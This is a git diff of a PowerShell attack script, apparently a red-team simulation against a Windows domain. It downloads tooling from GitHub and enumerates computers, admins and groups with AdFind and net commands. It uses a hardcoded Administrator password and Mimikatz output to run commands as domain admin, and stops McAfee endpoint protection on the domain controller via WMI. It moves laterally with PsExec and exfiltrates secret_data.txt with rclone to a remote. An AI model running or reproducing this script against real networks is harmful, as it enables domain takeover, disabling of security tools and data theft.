@@ -11,8 +11,10 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/p
 dir
 
 "Collect information about the victim"
-c:/exploit/adfind/adfind.exe -f "objectcategory=computer"  | select-string -pattern 'dn:CN=.*' > c:/exploit/computers.txt
+c:/exploit/adfind/adfind.exe -f "objectcategory=computer" | select-string -pattern 'dn:CN=.*' > c:/exploit/computers.txt
 get-content computers.txt
+c:/exploit/adfind/adfind.exe  -sc admincountdmp | select-string -pattern '>name:.*' > c:/exploit/admins.txt
+get-content admins.txt
 net group /domain > c:/exploit/group_domains.txt
 get-content group_domains.txt
 whoami /groups > c:/exploit/user_group.txt
@@ -48,12 +50,15 @@ dir c:\exploit
 get-content mimiout.txt
 
 
-"WMI Execution To DC"
+"Gaining Domain Admin!!!"
 $password = 'Cadmin!'
 $user = "sec.content\Administrator"
 $securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
 $admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
-Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent proces call where `"name='Windows Defender'`" call Terminate " -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /group" -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+
+"WMI Execution To DC"
+Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent service where name="McAfee Endpoint Security Threat Prevention" call stopservice /nointeractive " -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
 
 "PsExec To the DC"
 Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\dcontent cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden  -WorkingDirectory "c:\exploit\pstools\"
@@ -63,5 +68,6 @@ Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\expl
 "Exfil"
 net use w: \\dcontent\exploit
 xcopy  w:\secret_data.txt c:\exploit\ /E /y
+dir
 c:\exploit\rclone.exe copy c:\exploit\secret_data.txt remote:exfil
 
